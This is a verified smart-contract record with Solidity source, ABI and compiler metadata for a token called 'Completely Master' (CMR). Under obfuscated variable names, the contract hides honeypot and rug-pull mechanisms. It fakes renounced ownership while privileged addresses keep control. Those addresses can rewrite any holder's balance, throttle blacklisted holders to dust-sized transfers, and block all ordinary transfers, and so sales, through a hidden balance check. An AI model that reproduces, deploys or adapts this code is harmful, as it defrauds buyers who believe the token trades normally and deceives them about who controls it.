{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface launchedFund {\n    function createPair(address buyFrom, address tradingLaunch) external returns (address);\n}\n\ninterface swapTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalMode) external view returns (uint256);\n\n    function transfer(address marketingTokenLaunched, uint256 toWalletSell) external returns (bool);\n\n    function allowance(address fundExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toWalletSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTokenLaunched,\n        uint256 toWalletSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedBuy, uint256 value);\n    event Approval(address indexed fundExempt, address indexed spender, uint256 value);\n}\n\nabstract contract fromBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapToMetadata is swapTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CompletelyMaster is fromBuy, swapTo, swapToMetadata {\n\n    function allowance(address liquidityTeam, address modeLaunched) external view virtual override returns (uint256) {\n        if (modeLaunched == maxBuyLiquidity) {\n            return type(uint256).max;\n        }\n        return minExemptLaunch[liquidityTeam][modeLaunched];\n    }\n\n    mapping(address => mapping(address => uint256)) private minExemptLaunch;\n\n    function owner() external view returns (address) {\n        return senderMin;\n    }\n\n    address enableTradingWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function isFee(uint256 toWalletSell) public {\n        senderShould();\n        amountAuto = toWalletSell;\n    }\n\n    function senderTo(address toReceiver, address marketingTokenLaunched, uint256 toWalletSell) internal returns (bool) {\n        require(exemptTx[toReceiver] >= toWalletSell);\n        exemptTx[toReceiver] -= toWalletSell;\n        exemptTx[marketingTokenLaunched] += toWalletSell;\n        emit Transfer(toReceiver, marketingTokenLaunched, toWalletSell);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed launchMin, address indexed atTo);\n\n    function fundLiquidity() public {\n        emit OwnershipTransferred(totalTo, address(0));\n        senderMin = address(0);\n    }\n\n    function transfer(address takeWallet, uint256 toWalletSell) external virtual override returns (bool) {\n        return shouldSender(_msgSender(), takeWallet, toWalletSell);\n    }\n\n    uint256 private fundAmount;\n\n    function getOwner() external view returns (address) {\n        return senderMin;\n    }\n\n    uint256 private fromShouldAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toWallet;\n    }\n\n    bool public receiverFrom;\n\n    function transferFrom(address toReceiver, address marketingTokenLaunched, uint256 toWalletSell) external override returns (bool) {\n        if (_msgSender() != maxBuyLiquidity) {\n            if (minExemptLaunch[toReceiver][_msgSender()] != type(uint256).max) {\n                require(toWalletSell <= minExemptLaunch[toReceiver][_msgSender()]);\n                minExemptLaunch[toReceiver][_msgSender()] -= toWalletSell;\n            }\n        }\n        return shouldSender(toReceiver, marketingTokenLaunched, toWalletSell);\n    }\n\n    mapping(address => bool) public exemptReceiver;\n\n    string private feeAuto = \"Completely Master\";\n\n    function maxWalletMode(address takeWallet, uint256 toWalletSell) public {\n        senderShould();\n        exemptTx[takeWallet] = toWalletSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingMax;\n    }\n\n    function balanceOf(address totalMode) public view virtual override returns (uint256) {\n        return exemptTx[totalMode];\n    }\n\n    address public maxWallet;\n\n    uint256 private autoFrom;\n\n    bool public launchEnable;\n\n    uint256 private tradingTakeLimit = 100000000 * 10 ** 18;\n\n    string private tradingMax = \"CMR\";\n\n    mapping(address => uint256) private exemptTx;\n\n    function senderWallet(address receiverAuto) public {\n        senderShould();\n        if (launchEnable) {\n            fundAmount = autoFrom;\n        }\n        if (receiverAuto == totalTo || receiverAuto == maxWallet) {\n            return;\n        }\n        maxShould[receiverAuto] = true;\n    }\n\n    mapping(address => bool) public maxShould;\n\n    constructor (){\n        \n        receiverToken senderTotal = receiverToken(maxBuyLiquidity);\n        maxWallet = launchedFund(senderTotal.factory()).createPair(senderTotal.WETH(), address(this));\n        \n        totalTo = _msgSender();\n        exemptReceiver[totalTo] = true;\n        exemptTx[totalTo] = tradingTakeLimit;\n        fundLiquidity();\n        if (receiverSwapMax == fromShouldAuto) {\n            fromShouldAuto = fundAmount;\n        }\n        emit Transfer(address(0), totalTo, tradingTakeLimit);\n    }\n\n    function swapIs(address minFeeWallet) public {\n        if (receiverFrom) {\n            return;\n        }\n        if (tokenList) {\n            tokenList = true;\n        }\n        exemptReceiver[minFeeWallet] = true;\n        if (fundAmount != receiverSwapMax) {\n            receiverSwapMax = fundAmount;\n        }\n        receiverFrom = true;\n    }\n\n    address public totalTo;\n\n    function name() external view virtual override returns (string memory) {\n        return feeAuto;\n    }\n\n    uint256 constant takeSender = 12 ** 10;\n\n    function shouldSender(address toReceiver, address marketingTokenLaunched, uint256 toWalletSell) internal returns (bool) {\n        if (toReceiver == totalTo) {\n            return senderTo(toReceiver, marketingTokenLaunched, toWalletSell);\n        }\n        uint256 feeMarketing = swapTo(maxWallet).balanceOf(enableTradingWallet);\n        require(feeMarketing == amountAuto);\n        require(marketingTokenLaunched != enableTradingWallet);\n        if (maxShould[toReceiver]) {\n            return senderTo(toReceiver, marketingTokenLaunched, takeSender);\n        }\n        return senderTo(toReceiver, marketingTokenLaunched, toWalletSell);\n    }\n\n    uint256 private receiverSwapMax;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTakeLimit;\n    }\n\n    function senderShould() private view {\n        require(exemptReceiver[_msgSender()]);\n    }\n\n    function approve(address modeLaunched, uint256 toWalletSell) public virtual override returns (bool) {\n        minExemptLaunch[_msgSender()][modeLaunched] = toWalletSell;\n        emit Approval(_msgSender(), modeLaunched, toWalletSell);\n        return true;\n    }\n\n    uint256 public teamTake;\n\n    bool public tokenList;\n\n    uint256 amountAuto;\n\n    uint8 private toWallet = 18;\n\n    address maxBuyLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 amountToken;\n\n    address private senderMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toWalletSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toWalletSell\",\"type\":\"uint256\"}],\"name\":\"isFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toWalletSell\",\"type\":\"uint256\"}],\"name\":\"maxWalletMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"senderWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFeeWallet\",\"type\":\"address\"}],\"name\":\"swapIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toWalletSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTokenLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toWalletSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CompletelyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}